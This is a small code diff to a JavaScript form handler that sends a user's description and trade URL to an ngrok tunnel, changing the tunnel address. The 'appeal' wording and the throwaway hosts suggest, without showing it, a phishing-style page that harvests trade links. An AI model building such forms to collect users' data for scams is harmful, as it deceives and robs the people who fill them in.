@@ -17,7 +17,7 @@ function confirmUnderstanding() {
   const description = document.getElementById("descriptionBox").value.trim();
   const tradeUrl = document.getElementById("tradeUrl").value.trim();
 
-  fetch('https://c72f-93-115-0-42.ngrok-free.app/api/submit-appeal', {
+  fetch('https://5f40-156-59-50-203.ngrok-free.app', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ description, tradeUrl })
